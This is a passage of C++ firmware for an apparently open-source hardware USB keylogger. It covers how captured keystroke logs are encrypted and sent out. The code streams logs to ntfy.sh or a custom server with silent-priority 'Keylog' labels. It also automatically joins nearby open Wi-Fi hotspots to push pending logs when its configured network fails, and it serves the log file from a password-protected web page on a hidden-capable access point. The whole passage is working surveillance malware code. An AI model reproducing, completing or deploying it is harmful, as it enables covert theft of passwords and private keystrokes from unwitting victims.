  if (c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
  if (c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
  return 0;
}

// Decode a 32-char hex string into 16 raw bytes. Returns false if length != 32
// or any character is not a valid hex digit.
static bool hexDecode16(const String& hex, uint8_t out[16]) {
  if (hex.length() != 32) return false;
  for (int i = 0; i < 16; i++) {
    char hi = hex[i * 2], lo = hex[i * 2 + 1];
    bool valid = ((hi >= '0' && hi <= '9') || (hi >= 'a' && hi <= 'f') || (hi >= 'A' && hi <= 'F'))
              && ((lo >= '0' && lo <= '9') || (lo >= 'a' && lo <= 'f') || (lo >= 'A' && lo <= 'F'));
    if (!valid) return false;
    out[i] = (hexNibble(hi) << 4) | hexNibble(lo);
  }
  return true;
}

bool encryptPayload(const uint8_t* data, size_t len, String& encryptedText) {
  if (cfg.push_key.length() == 0 && applyGeneratedPushDefaults(currentUniqueID())) writeConfigFile();

  // Derive the 16-byte AES key by direct hex-decode of the stored 32-char hex key.
  // The decrypt tools (decrypt_push.js / decrypt_push.html) use the same scheme.
  uint8_t keyBytes[16] = {0};
  hexDecode16(cfg.push_key, keyBytes);   // silently uses zeros if key is somehow invalid

  size_t pad = 16 - (len % 16);
  size_t cipherLen = len + pad;
  uint8_t* cipher = (uint8_t*)malloc(cipherLen + 16);
  if (!cipher) return false;

  uint8_t* iv = cipher;
  uint8_t* block = cipher + 16;
  for (size_t i = 0; i < 16; i += 4) {
    uint32_t rnd = readHardwareRandom();
    iv[i] = rnd & 0xFF;
    iv[i + 1] = (rnd >> 8) & 0xFF;
    iv[i + 2] = (rnd >> 16) & 0xFF;
    iv[i + 3] = (rnd >> 24) & 0xFF;
  }

  memcpy(block, data, len);
  memset(block + len, (uint8_t)pad, pad);

  br_aes_ct_cbcenc_keys aes;
  br_aes_ct_cbcenc_init(&aes, keyBytes, 16);
  uint8_t ivWork[16];
  memcpy(ivWork, iv, 16);
  br_aes_ct_cbcenc_run(&aes, ivWork, block, cipherLen);

  encryptedText = "AES128CBC:";
  encryptedText += base64Encode(cipher, cipherLen + 16);
  free(cipher);
  return true;
}

// ---- ntfy.sh: POST encrypted Base64 text to server/topic ----
bool pushViaNtfy(const String& payload) {
  HTTPClient http;
  WiFiClient plainClient;
  String server = forceHttpUrl(cfg.ntfy_server);
  if (server.length() == 0) server = "http://ntfy.sh";
  String url = joinUrl(server, cfg.ntfy_topic);
  pushLastHttpCode = 0;
  if (!http.begin(plainClient, url)) {
    pushLastResult = "ntfy begin failed";
    pushLastFailureReason = pushLastResult;
    pushLastDeliveryOK = false;
    return false;
  }
  http.setTimeout(10000);
  http.setReuse(false);
  http.setFollowRedirects(HTTPC_FORCE_FOLLOW_REDIRECTS);
  http.addHeader("Content-Type", "text/plain");
  pushSeqNum++;
  String mac = WiFi.macAddress(); mac.replace(":", "");
  String label = "Keylog-" + mac + "-" + pushSessionID;
  http.addHeader("Filename", label + ".txt");
  http.addHeader("Title", label);
  http.addHeader("Priority", "min");      // silent delivery
  http.addHeader("Tags", "keyboard");
  int code = http.POST((uint8_t*)payload.c_str(), payload.length());
  pushLastHttpCode = code;
  if (code < 0) {
    // Distinguish DNS failure from TCP refusal for clearer diagnostics
    IPAddress resolvedIP;
    String host = server;
    int slashPos = host.indexOf('/', 7);
    if (slashPos > 0) host = host.substring(0, slashPos);
    int colonPos = host.lastIndexOf(':');
    if (colonPos > 6) host = host.substring(0, colonPos);
    // strip scheme
    if (host.startsWith("http://"))  host = host.substring(7);
    if (host.startsWith("https://")) host = host.substring(8);
    if (!WiFi.hostByName(host.c_str(), resolvedIP)) {
      pushLastResult = "ntfy DNS failed (no internet?)";
    } else {
      pushLastResult = "ntfy " + HTTPClient::errorToString(code);
    }
    pushLastFailureReason = pushLastResult;
    pushLastDeliveryOK = false;
  }
  http.end();
  return (code >= 200 && code < 300);
}

// ---- Custom HTTP(S) endpoint ----
bool pushViaHTTP(const String& payload) {
  HTTPClient http;
  WiFiClient plainClient;
  String url = forceHttpUrl(cfg.push_url);
  pushLastHttpCode = 0;
  if (!http.begin(plainClient, url)) {
    pushLastResult = "HTTP begin failed";
    pushLastFailureReason = pushLastResult;
    pushLastDeliveryOK = false;
    return false;
  }
  http.setTimeout(10000);
  http.setReuse(false);
  http.setFollowRedirects(HTTPC_FORCE_FOLLOW_REDIRECTS);
  http.addHeader("Content-Type", "text/plain");
  if (cfg.push_token.length() > 0) {
    http.addHeader("Authorization", "Bearer " + cfg.push_token);
  }
  String macH = WiFi.macAddress(); macH.replace(":", "");
  http.addHeader("X-Device-ID", macH);
  pushSeqNum++;
  http.addHeader("X-Push-Session", pushSessionID);
  http.addHeader("X-Push-Seq", String(pushSeqNum));
  int code = http.POST((uint8_t*)payload.c_str(), payload.length());
  pushLastHttpCode = code;
  if (code < 0) {
    IPAddress resolvedIP;
    String host = url;
    if (host.startsWith("http://"))  host = host.substring(7);
    if (host.startsWith("https://")) host = host.substring(8);
    int slashPos = host.indexOf('/');
    if (slashPos > 0) host = host.substring(0, slashPos);
    int colonPos = host.lastIndexOf(':');
    if (colonPos > 0) host = host.substring(0, colonPos);
    if (!WiFi.hostByName(host.c_str(), resolvedIP)) {
      pushLastResult = "HTTP DNS failed (no internet?)";
    } else {
      pushLastResult = "HTTP " + HTTPClient::errorToString(code);
    }
    pushLastFailureReason = pushLastResult;
    pushLastDeliveryOK = false;
  }
  http.end();
  return (code >= 200 && code < 300);
}

// Push ALL remaining log data in a SINGLE HTTP request using streaming
// encryption.  Two passes over the log files:
//   Pass 1 – count sanitized bytes (cheap scan, ~128 B read buffer)
//   Pass 2 – read → sanitize → AES-CBC encrypt → Base64 → TCP send
//
// Memory usage is constant (~700 B on stack) regardless of total log size.
// The result is always PUSH_DONE on success — PUSH_MORE is never returned
// because the data is streamed, not buffered in RAM.
PushResult pushOneChunk() {
  if (WiFi.status() != WL_CONNECTED) {
    pushLastResult = "No STA connection";
    pushLastFailureReason = pushLastResult;
    pushLastWifiSSID = "";
    pushLastDeliveryOK = false;
    return PUSH_ERROR;
  }

  logFile.flush();
  logDirty = false;
  pushLastResult = "Sending";
  pushLastHttpCode = 0;

  if (pushSlot >= LOG_SLOT_COUNT) {
    pushSlot = 0;
    pushOffset = 0;
    savePushState();
  }

  // ── Pass 1: count sanitized bytes + snapshot file sizes ───────────
  size_t slotSnap[LOG_SLOT_COUNT];
  memset(slotSnap, 0, sizeof(slotSnap));
  size_t totalClean = 0;
  size_t totalRaw   = 0;
  {
    uint8_t tmp[128];
    for (uint8_t s = pushSlot; ; ) {
      char p[SLOT_PATH_SIZE];
      slotPath(s, p);
      File f = LittleFS.open(p, "r");
      if (f) {
        size_t fsize = f.size();
        slotSnap[s] = fsize;
        size_t ofs = (s == pushSlot) ? pushOffset : 0;
        if (ofs < fsize) {
          f.seek(ofs);
          totalRaw += (fsize - ofs);
          size_t left = fsize - ofs;
          while (left > 0) {
            size_t chunk = (left < sizeof(tmp)) ? left : sizeof(tmp);
            size_t got = f.read(tmp, chunk);
            if (got == 0) break;
            left -= got;
            for (size_t i = 0; i < got; i++) {
              if (isLogAscii(tmp[i])) totalClean++;
            }
          }
        }
        f.close();
      }
      if (s == 0) break;
      s--;
    }
  }

  if (totalRaw == 0) {
    pushLastResult = "No new data";
    return PUSH_DONE;
  }

  // Raw bytes exist but none are printable — skip past them.
  if (totalClean == 0) {
    pushSlot = 0;
    pushOffset = slotSnap[0];
    savePushState();
    pushLastResult = "No printable data";
    return PUSH_DONE;
  }

  // ── Calculate encrypted payload size ──────────────────────────────
  // Wire format: "AES128CBC:" + base64( IV[16] || AES-CBC-ciphertext )
  // PKCS7 always adds 1..16 padding bytes.
  size_t pkcs7Pad  = 16 - (totalClean % 16);
  size_t cipherLen = totalClean + pkcs7Pad;
  size_t b64In     = 16 + cipherLen;             // IV + ciphertext
  size_t b64Out    = ((b64In + 2) / 3) * 4;
  size_t bodyLen   = 10 + b64Out;                // strlen("AES128CBC:") + base64

  // ── Prepare AES key + random IV ───────────────────────────────────
  if (cfg.push_key.length() == 0 && applyGeneratedPushDefaults(currentUniqueID()))
    writeConfigFile();

  uint8_t keyBytes[16] = {0};
  hexDecode16(cfg.push_key, keyBytes);

  uint8_t iv[16];
  for (size_t i = 0; i < 16; i += 4) {
    uint32_t rnd = readHardwareRandom();
    iv[i]   =  rnd        & 0xFF;
    iv[i+1] = (rnd >>  8) & 0xFF;
    iv[i+2] = (rnd >> 16) & 0xFF;
    iv[i+3] = (rnd >> 24) & 0xFF;
  }

  br_aes_ct_cbcenc_keys aesCtx;
  br_aes_ct_cbcenc_init(&aesCtx, keyBytes, 16);
  uint8_t ivWork[16];
  memcpy(ivWork, iv, 16);

  // ── Build target URL ──────────────────────────────────────────────
  bool isNtfy = (cfg.push_mode == "1");
  String url;
  if (isNtfy) {
    String server = forceHttpUrl(cfg.ntfy_server);
    if (server.length() == 0) server = "http://ntfy.sh";
    url = joinUrl(server, cfg.ntfy_topic);
  } else if (cfg.push_mode == "2") {
    url = forceHttpUrl(cfg.push_url);
  } else {
    pushLastResult = "Disabled";
    return PUSH_DONE;
  }

  // Parse host / port / path from "http://host[:port]/path"
  String host, path;
  int port = 80;
  {
    int slash = url.indexOf('/', 7);          // skip "http://"
    host = (slash > 0) ? url.substring(7, slash) : url.substring(7);
    path = (slash > 0) ? url.substring(slash)    : String("/");
    int colon = host.lastIndexOf(':');
    if (colon > 0) {
      port = host.substring(colon + 1).toInt();
      host = host.substring(0, colon);
    }
  }

  // ── TCP connect ───────────────────────────────────────────────────
  WiFiClient tcp;
  if (!tcp.connect(host.c_str(), port)) {
    IPAddress resolved;
    bool dnsOk = WiFi.hostByName(host.c_str(), resolved);
    pushLastResult = String(isNtfy ? "ntfy " : "HTTP ") +
                     (dnsOk ? "TCP connect failed" : "DNS failed (no internet?)");
    pushLastFailureReason = pushLastResult;
    pushLastDeliveryOK = false;
    return PUSH_ERROR;
  }
  tcp.setTimeout(10000);

  // ── HTTP request headers ──────────────────────────────────────────
  pushSeqNum++;

  tcp.print(String("POST ") + path + " HTTP/1.1\r\n");
  tcp.print(String("Host: ") + host + "\r\n");
  tcp.print(String("Content-Length: ") + String(bodyLen) + "\r\n");
  tcp.print("Content-Type: text/plain\r\n");
  tcp.print("Connection: close\r\n");

  String macPlain = WiFi.macAddress();
  macPlain.replace(":", "");
  String pushLabel = "Keylog-" + macPlain + "-" + pushSessionID;

  if (isNtfy) {
    tcp.print(String("Filename: ") + pushLabel + ".txt\r\n");
    tcp.print(String("Title: ") + pushLabel + "\r\n");
    tcp.print("Priority: min\r\n");
    tcp.print("Tags: keyboard\r\n");
  } else {
    if (cfg.push_token.length() > 0)
      tcp.print(String("Authorization: Bearer ") + cfg.push_token + "\r\n");
    tcp.print(String("X-Device-ID: ") + macPlain + "\r\n");
    tcp.print(String("X-Push-Session: ") + pushSessionID + "\r\n");
    tcp.print(String("X-Push-Seq: ") + String(pushSeqNum) + "\r\n");
  }
  tcp.print("\r\n");                           // end of headers

  // ── Stream body: "AES128CBC:" + base64(IV + ciphertext) ───────────
  tcp.print("AES128CBC:");

  // Inline base64 streamer (3 raw bytes -> 4 base64 chars, flushed via TCP)
  static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  uint8_t b64Acc[3];
  uint8_t b64Pos = 0;
  char    outBuf[256];
  size_t  outPos = 0;

  // Feed raw bytes into the base64 encoder; auto-flushes to TCP.
  auto b64Feed = [&](const uint8_t* d, size_t n) {
    for (size_t i = 0; i < n; i++) {
      b64Acc[b64Pos++] = d[i];
      if (b64Pos == 3) {
        uint32_t v = ((uint32_t)b64Acc[0] << 16) |
                     ((uint32_t)b64Acc[1] <<  8) | b64Acc[2];
        outBuf[outPos++] = B64[(v >> 18) & 0x3F];
        outBuf[outPos++] = B64[(v >> 12) & 0x3F];
        outBuf[outPos++] = B64[(v >>  6) & 0x3F];
        outBuf[outPos++] = B64[ v        & 0x3F];
        b64Pos = 0;
        if (outPos >= 252) {                   // flush at 252 (multiple of 4)
          tcp.write((const uint8_t*)outBuf, outPos);
          outPos = 0;
          processSerialBytes();
        }
      }
    }
  };

  // Flush remaining 1-2 bytes with '=' padding, then send buffer.
  auto b64Finish = [&]() {
    if (b64Pos > 0) {
      uint8_t a = b64Acc[0], b = (b64Pos > 1) ? b64Acc[1] : (uint8_t)0;
      uint32_t v = ((uint32_t)a << 16) | ((uint32_t)b << 8);
      outBuf[outPos++] = B64[(v >> 18) & 0x3F];
      outBuf[outPos++] = B64[(v >> 12) & 0x3F];
      outBuf[outPos++] = (b64Pos > 1) ? B64[(v >> 6) & 0x3F] : '=';
      outBuf[outPos++] = '=';
      b64Pos = 0;
    }
    if (outPos > 0) {
      tcp.write((const uint8_t*)outBuf, outPos);
      outPos = 0;
    }
  };

  // ── Feed IV (16 bytes, unencrypted) into the base64 stream ────────
  b64Feed(iv, 16);

  // ── Pass 2: log files -> sanitize -> AES-CBC -> base64 -> TCP ─────
  uint8_t ptBlock[16];                         // plaintext accumulator
  size_t  ptPos = 0;
  uint8_t rdBuf[128];                          // file read buffer
  uint8_t endSlot   = pushSlot;
  size_t  endOffset = pushOffset;

  for (uint8_t s = pushSlot; ; ) {
    if (slotSnap[s] == 0) { if (s == 0) break; s--; continue; }
    char p[SLOT_PATH_SIZE];
    slotPath(s, p);
    File f = LittleFS.open(p, "r");
    if (!f) { if (s == 0) break; s--; continue; }

    size_t ofs     = (s == pushSlot) ? pushOffset : 0;
    size_t readEnd = slotSnap[s];               // don't read past Pass-1 snapshot
    if (ofs >= readEnd) { f.close(); if (s == 0) break; s--; continue; }
    f.seek(ofs);
    size_t left = readEnd - ofs;

    while (left > 0) {
      size_t want = (left < sizeof(rdBuf)) ? left : sizeof(rdBuf);
      size_t got  = f.read(rdBuf, want);
      if (got == 0) break;
      left -= got;
      processSerialBytes();
      for (size_t i = 0; i < got; i++) {
        if (!isLogAscii(rdBuf[i])) continue;
        ptBlock[ptPos++] = rdBuf[i];
        if (ptPos == 16) {
          br_aes_ct_cbcenc_run(&aesCtx, ivWork, ptBlock, 16);
          b64Feed(ptBlock, 16);                // ptBlock now holds ciphertext
          ptPos = 0;
        }
      }
    }
    f.close();
    endSlot   = s;
    endOffset = readEnd;
    if (s == 0) break;
    s--;
  }

  // ── PKCS7 padding -> encrypt -> base64 for the final block ────────
  {
    uint8_t padVal = (uint8_t)(16 - ptPos);    // 1..16
    memset(ptBlock + ptPos, padVal, padVal);
    br_aes_ct_cbcenc_run(&aesCtx, ivWork, ptBlock, 16);
    b64Feed(ptBlock, 16);
  }
  b64Finish();

  // ── Read HTTP response status ─────────────────────────────────────
  int httpCode = 0;
  {
    unsigned long t0 = millis();
    while (!tcp.available() && (millis() - t0 < 10000)) { processSerialBytes(); delay(10); yield(); }
    if (tcp.available()) {
      String line = tcp.readStringUntil('\n');
      int sp = line.indexOf(' ');
      if (sp > 0) httpCode = line.substring(sp + 1, sp + 4).toInt();
    }
  }
  tcp.stop();
  pushLastHttpCode = httpCode;

  // ── Success / error ───────────────────────────────────────────────
  if (httpCode >= 200 && httpCode < 300) {
    pushLastResult        = "OK";
    pushLastFailureReason = "";
    pushLastWifiSSID      = WiFi.SSID();
    pushLastDeliveryOK    = true;
    pushSlot   = endSlot;
    pushOffset = endOffset;
    savePushState();
    return PUSH_DONE;
  }

  if (httpCode > 0) {
    pushLastResult = "Failed";
    pushLastFailureReason = "HTTP " + String(httpCode);
  } else {
    pushLastResult = String(isNtfy ? "ntfy" : "HTTP") + " no response";
    pushLastFailureReason = pushLastResult;
  }
  pushLastWifiSSID   = "";
  pushLastDeliveryOK = false;
  return PUSH_ERROR;
}

bool sendPushTestPayload() {
  if (!push_configured) {
    pushLastResult = "Disabled";
    pushLastFailureReason = "";
    pushLastWifiSSID = "";
    pushLastDeliveryOK = false;
    pushLastHttpCode = 0;
    return false;
  }
  if (WiFi.status() != WL_CONNECTED) {
    pushLastResult = "No STA connection";
    pushLastFailureReason = pushLastResult;
    pushLastWifiSSID = "";
    pushLastDeliveryOK = false;
    pushLastHttpCode = 0;
    return false;
  }

  const char* testText = "ANT Project push test";
  String payload;
  if (!encryptPayload((const uint8_t*)testText, strlen(testText), payload)) {
    pushLastResult = "Encryption failed";
    pushLastFailureReason = pushLastResult;
    pushLastWifiSSID = "";
    pushLastDeliveryOK = false;
    pushLastHttpCode = 0;
    return false;
  }

  pushLastResult = "Testing";
  pushLastHttpCode = 0;
  bool success = false;
  if      (cfg.push_mode == "1") success = pushViaNtfy(payload);
  else if (cfg.push_mode == "2") success = pushViaHTTP(payload);

  if (success) {
    pushLastResult = "Test OK";
    pushLastFailureReason = "";
    pushLastWifiSSID = WiFi.SSID();
    pushLastDeliveryOK = true;
    nextPushAttemptAt = 0;
  } else {
    if (pushLastFailureReason.length() == 0) {
      pushLastFailureReason = pushLastResult;
    }
    pushLastWifiSSID = "";
    pushLastDeliveryOK = false;
    nextPushAttemptAt = millis() + pushRetryInterval;
  }
  return success;
}

// Per-request state for the chunked log reader. It stays alive until the
// client disconnects, so the file handle can be reused across chunks.
struct LogStreamCtx {
  size_t sizes[LOG_SLOT_COUNT];     // sizes[i] = bytes in i-th file of the
  size_t cumStart[LOG_SLOT_COUNT];  // stream (i=0 oldest, i=N-1 newest)
  size_t total;
  int    cachedSlot;
  File   cachedFile;
};

// Stream all slots, oldest first, as a single response. The file handle is
// kept open across chunks and only re-opened when we cross slot boundaries.
void serveCombinedLog(AsyncWebServerRequest* request, bool asDownload) {
  logFile.flush();
  logDirty = false;

  LogStreamCtx* ctx = new LogStreamCtx();
  if (!ctx) {
    request->send(500, "text/plain", "No memory");
    return;
  }
  ctx->total = 0;
  ctx->cachedSlot = -1;
  request->onDisconnect([ctx]() {
    if (ctx->cachedFile) ctx->cachedFile.close();
    delete ctx;
  });
  // Snapshot file sizes before streaming; if rotation happens mid-stream the
  // chunk callback handles missing files gracefully (returns 0 for that slot).
  if (logRotationBusy) {
    request->onDisconnect(nullptr);
    delete ctx;
    request->send(503, "text/plain", "Log rotation in progress, retry shortly");
    return;
  }
  for (int i = 0; i < LOG_SLOT_COUNT; i++) {
    int slot = LOG_SLOT_COUNT - 1 - i;  // oldest first
    char p[SLOT_PATH_SIZE];
    slotPath(slot, p);
    ctx->cumStart[i] = ctx->total;
    ctx->sizes[i] = fileSizeOrZero(p);
    ctx->total += ctx->sizes[i];
  }

  AsyncWebServerResponse* response = request->beginChunkedResponse(
    "text/plain; charset=utf-8",
    [ctx](uint8_t* buf, size_t maxLen, size_t idx) -> size_t {
      if (idx >= ctx->total) {
        if (ctx->cachedFile) ctx->cachedFile.close();
        return 0;
      }
      for (int i = 0; i < LOG_SLOT_COUNT; i++) {
        if (idx < ctx->cumStart[i] + ctx->sizes[i]) {
          int slot = LOG_SLOT_COUNT - 1 - i;
          size_t offset = idx - ctx->cumStart[i];

          if (ctx->cachedSlot != slot) {
            if (ctx->cachedFile) ctx->cachedFile.close();
            char p[SLOT_PATH_SIZE];
            slotPath(slot, p);
            ctx->cachedFile = LittleFS.open(p, "r");
            ctx->cachedSlot = slot;
          }
          if (!ctx->cachedFile) return 0;
          if (!ctx->cachedFile.seek(offset)) return 0;
          size_t remain = ctx->sizes[i] - offset;
          size_t want = (maxLen < remain) ? maxLen : remain;
          size_t n = ctx->cachedFile.read(buf, want);
          // BUG-2 fix: do NOT call sanitizeLogBytes here.  writeAsciiLog()
          // already guarantees the file only contains printable ASCII + \n\t.
          // Calling sanitize with compaction would desync idx from the real
          // file position, causing repeated output of the same region.
          return n;
        }
      }
      return 0;
    });

  if (asDownload) {
    response->addHeader("Content-Disposition", "attachment; filename=keyLog.txt");
  }
  request->send(response);
}

void sendNoStoreProgmem(AsyncWebServerRequest* request, const String& contentType, PGM_P content) {
  AsyncWebServerResponse* response = request->beginResponse_P(200, contentType, content, templateProcessor);
  response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
  response->addHeader("Pragma", "no-cache");
  request->send(response);
}

void sendNoStoreProgmemGzip(AsyncWebServerRequest* request, const String& contentType, const uint8_t* content, size_t len) {
  AsyncWebServerResponse* response = request->beginResponse_P(200, contentType, content, len);
  response->addHeader("Content-Encoding", "gzip");
  response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
  response->addHeader("Pragma", "no-cache");
  request->send(response);
}

void sendCaptivePortalLanding(AsyncWebServerRequest* request) {
  AsyncResponseStream* response = request->beginResponseStream("text/html; charset=utf-8");
  response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
  response->addHeader("Pragma", "no-cache");
  response->print(F("<!DOCTYPE html><html><head><meta charset='utf-8'>"
                    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                    "<meta http-equiv='refresh' content='0;url=/'>"
                    "<title>USBKeylogger</title></head><body>"
                    "<p><a href='/'>Open USBKeylogger</a></p>"
                    "</body></html>"));
  request->send(response);
}

void printPageStart(Print* response, const char* titleKey) {
  response->print("<!DOCTYPE html><html><head><meta charset='utf-8'><script src='/common.js?v=ui10'></script></head><body><main class='page'><header class='topbar'><div class='title-line'><div><a href='https://github.com/Push3AX/USBKeylogger' style='text-decoration:none;color:inherit'><p class='kicker'>ANT Project</p><h1 data-i18n='");
  response->print(titleKey);
  response->print("'></h1></a></div><span class='badge'>v");
  response->print(Version);
  response->print("</span></div></header>");
}

void printPageEnd(Print* response) {
  response->print("</main></body></html>");
}

void sendMessagePage(AsyncWebServerRequest* request, const char* titleKey, const char* messageKey,
                     const char* primaryKey, const char* primaryUrl,
                     const char* secondaryKey = nullptr, const char* secondaryUrl = nullptr) {
  AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
  printPageStart(response, titleKey);
  response->print("<section class='panel'><p data-i18n='");
  response->print(messageKey);
  response->print("'></p><div class='button-row'><button type='button' onclick=\"location.href='");
  response->print(primaryUrl);
  response->print("'\" data-i18n='");
  response->print(primaryKey);
  response->print("'></button>");
  if (secondaryKey && secondaryUrl) {
    response->print("<button class='secondary' type='button' onclick=\"location.href='");
    response->print(secondaryUrl);
    response->print("'\" data-i18n='");
    response->print(secondaryKey);
    response->print("'></button>");
  }
  response->print("</div></section>");
  printPageEnd(response);
  request->send(response);
}

void resetRuntimePushState() {
  pushSlot = 0;
  pushOffset = 0;
  pushPending = true;
  nextPushAttemptAt = 0;
  pushLastResult = "Pending";
  pushLastHttpCode = 0;
  pushLastFailureReason = "";
  pushLastWifiSSID = "";
  pushLastDeliveryOK = false;
  if (LittleFS.exists(pushStatePath)) LittleFS.remove(pushStatePath);
}

void startWiFi(){
  WiFi.mode(WIFI_AP_STA);
  WiFi.hostname("USBKeylogger");
  WiFi.setAutoReconnect(false);
  WiFi.softAPConfig(IPAddr, IPAddr, subnet);
  WiFi.softAP(cfg.AP_SSID.c_str(), cfg.AP_password.c_str(), 2, cfg.AP_hidssid.toInt()); // Channel 2
  if (STA_configured) WiFi.begin(cfg.STA_SSID.c_str(), cfg.STA_password.c_str());
}

// ── Open-WiFi Auto-Push ───────────────────────────────────────────────────
// When enabled (cfg.wifi_probe == "1") and the configured push delivery has
// not succeeded, the device scans for open (unencrypted) hotspots sorted by
// RSSI and tries each one in turn: connect → push all pending log data →
// disconnect → restore original STA.
//
// All blocking I/O (WiFi.begin, pushOneChunk) happens inside loop() via
// runOpenWifiProbe() — NEVER inside an AsyncWebServer callback.
// ─────────────────────────────────────────────────────────────────────────

static String loadProbeSavedSSID() {
  if (!LittleFS.exists(probeSavedPath)) return "";
  File f = LittleFS.open(probeSavedPath, "r");
  if (!f) return "";
  String s = f.readString();
  f.close();
  s.trim();
  return s;
}

static void saveProbeSavedSSID(const String& ssid) {
  File f = LittleFS.open(probeSavedPath, "w");
  if (f) { f.print(ssid); f.close(); }
}

static void clearProbeSavedSSID() {
  if (LittleFS.exists(probeSavedPath)) LittleFS.remove(probeSavedPath);
}

// Restore STA and mark probe cycle as finished.
static void probeAbort(unsigned long now) {
  WiFi.scanDelete();
  WiFi.disconnect(false);
  probePhase  = PROBE_IDLE;
  probeLastAt = now;
  if (STA_configured) WiFi.begin(cfg.STA_SSID.c_str(), cfg.STA_password.c_str());
}

// Attempt NTP sync while probe connection is still active (up to 5 seconds).
static void probeAttemptNTP() {
  if (ntpSynced) return;
  if (!ntpConfigured) {
    configTime(0, 0, cfg.ntp_server.c_str(), "time.nist.gov", "time.cloudflare.com");
    ntpConfigured = true;
  }
  for (int i = 0; i < 50; i++) {
    processSerialBytes();
    delay(100);
    time_t now = time(nullptr);
    if (now > 1577836800UL) {
      time_t local = now + tzOffsetSeconds();
      struct tm t;
      gmtime_r(&local, &t);
      char tz[16];
      tzLabel(tz, sizeof(tz));
      char buf[64];
      snprintf(buf, sizeof(buf),
               "== NTP: %04d-%02d-%02d %02d:%02d:%02d %s ==\n",
               t.tm_year + 1900, t.tm_mon + 1, t.tm_mday,
               t.tm_hour, t.tm_min, t.tm_sec, tz);
      writeAsciiLog(buf);
      logDirty = true;
      ntpSynced = true;
      return;
    }
  }
}

// Push all pending data through the current connection.
// Returns true on success (PUSH_DONE), false on error.
static bool probePushAll() {
  while (true) {
    PushResult r = pushOneChunk();
    processSerialBytes();
    yield();
    if (r == PUSH_DONE) { pushPending = false; lastScheduledPushAt = millis(); return true; }
    if (r == PUSH_ERROR) return false;
  }
}

// Start connecting to the next open (no-password) network in the scan list.
// Returns true if a connection attempt was started, false if list exhausted.
static bool probeConnectNext(unsigned long now) {
  while (probeNetIdx < probeNetCount) {
    int i = probeNetIdx++;
    if (WiFi.encryptionType(i) != ENC_TYPE_NONE) continue;  // skip secured
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) continue;                        // skip hidden
    if (ssid == cfg.STA_SSID) continue;                      // skip known STA (already failing)
    WiFi.begin(ssid.c_str());
    probePhase   = PROBE_CONNECTING;
    probePhaseAt = now;
    return true;
  }
  return false;
}

void runOpenWifiProbe() {
  // Abort any in-progress probe if the feature is disabled
  if (cfg.wifi_probe != "1" || !push_configured) {
    if (probePhase != PROBE_IDLE) probeAbort(millis());
    return;
  }
  // Defer probe while a manual push-test is pending
  if (pushTestPending) return;

  unsigned long now = millis();

  // ── IDLE: decide whether to start a new probe cycle ──────────────────
  if (probePhase == PROBE_IDLE) {
    if (!pushPending || pushLastDeliveryOK) return;          // nothing to push / STA works
    { static bool probeInitDone = false;
      if (STA_configured && !probeInitDone) {
        if (now < PROBE_INIT_MS) return;
        probeInitDone = true;
      }
    }
    if (probeLastAt != 0 && now - probeLastAt < PROBE_RETRY_MS) return; // cool-down
    // Try previously saved hotspot first (skip scan if available)
    String saved = loadProbeSavedSSID();
    if (saved.length() > 0 && saved != cfg.STA_SSID) {
      WiFi.disconnect(false);
      WiFi.begin(saved.c_str());
      probePhase   = PROBE_SAVED_TRY;
      probePhaseAt = now;
      return;
    }
    // No saved hotspot — go straight to scan
    WiFi.disconnect(false);
    WiFi.scanNetworks(/*async=*/true);
    probePhase    = PROBE_SCANNING;
    probePhaseAt  = now;
    probeNetIdx   = 0;
    probeNetCount = 0;
    return;
  }

  // ── SAVED_TRY: try the previously successful hotspot ────────────────
  if (probePhase == PROBE_SAVED_TRY) {
    if (WiFi.status() == WL_CONNECTED) {
      if (probePushAll()) {
        writeAsciiLog(("== Probe: push via " + WiFi.SSID() + " ==\n").c_str());
        logDirty = true;
        probeAttemptNTP();
        probeAbort(now);
        return;
      }
      // Push failed on saved hotspot — clear it and fall through to scan
      clearProbeSavedSSID();
      probeAbort(now);
      return;
    }
    if (now - probePhaseAt < PROBE_CONN_MS) return;          // still connecting
    // Saved hotspot not available — clear it and fall through to full scan
    clearProbeSavedSSID();
    WiFi.disconnect(false);
    WiFi.scanNetworks(/*async=*/true);
    probePhase    = PROBE_SCANNING;
    probePhaseAt  = now;
    probeNetIdx   = 0;
    probeNetCount = 0;
    return;
  }

  // ── SCANNING: wait for scan results ──────────────────────────────────
  if (probePhase == PROBE_SCANNING) {
    if (now - probePhaseAt > PROBE_SCAN_MS) { probeAbort(now); return; } // scan timeout
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_RUNNING) return;                      // still scanning
    probeNetCount = (n > 0) ? n : 0;
    probeNetIdx   = 0;
    if (!probeConnectNext(now)) probeAbort(now);             // no open networks found
    return;
  }

  // ── CONNECTING: wait for association, then push all pending data ──────
  if (probePhase == PROBE_CONNECTING) {
    if (WiFi.status() == WL_CONNECTED) {
      if (probePushAll()) {
        String ssid = WiFi.SSID();
        saveProbeSavedSSID(ssid);
        writeAsciiLog(("== Probe: push via " + ssid + " ==\n").c_str());
        logDirty = true;
        probeAttemptNTP();
      }
      probeAbort(now);
      return;
    }
    if (now - probePhaseAt < PROBE_CONN_MS) return;          // still connecting
    // Connect timeout → try next open network
    WiFi.disconnect(false);
    if (!probeConnectNext(now)) probeAbort(now);
  }
}

// Returns true if the request is authenticated (or auth is disabled).
// Sends a 401 response and returns false when auth is required but missing/wrong.
bool isAuthenticated(AsyncWebServerRequest* request) {
  if (cfg.web_password.length() == 0) return true;
  return request->authenticate("admin", cfg.web_password.c_str());
}

bool requireAuth(AsyncWebServerRequest* request) {
  if (isAuthenticated(request)) return true;
  request->requestAuthentication("USBKeylogger");
  return false;
}

void startWebInterface(){
  webServer.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    sendNoStoreProgmem(request, "text/html; charset=utf-8", HTML_Index);
  });
  webServer.on("/log", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    serveCombinedLog(request, false);
  });
